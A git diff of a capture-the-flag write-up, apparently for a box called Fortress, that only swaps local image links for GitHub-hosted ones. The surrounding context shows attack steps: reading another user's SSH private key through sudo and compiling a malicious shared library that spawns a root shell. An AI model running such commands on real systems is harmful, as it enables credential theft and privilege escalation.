@@ -331,7 +331,7 @@ So we can successfully see that flag that only `j4x0n` user does so now we can a
 ```shell
 $ sudo -u j4x0n cat /home/j4x0n/.ssh/id_rsa
 ```
-![[fortress_jaxonkey.png]]
+![fortress_jaxonkey](https://user-images.githubusercontent.com/85181215/133460060-52eca4f6-dfc4-41a6-a338-68133e67cffe.png)
 So now we have the `j4x0n` key also so we do the same step for `j4x0n` also
 ```shell
 $ echo 'private key here' > j4x0n_rsa
@@ -486,7 +486,7 @@ system("/bin/bash");
 $ gcc -fPIC -shared -o libfoo.so libfoo.c
 ```
 They give us the file `libfoo.so` with malicious code
-![[fortress_JaxonPri-EscBinaryLocation.png]]
+![fortress_JaxonPri-EscBinaryLocation](https://user-images.githubusercontent.com/85181215/133459925-ce02f9eb-3ec1-44b0-84f8-36c307bd42c2.png)
 
 Now we can copy that binary in that location using the following command
 
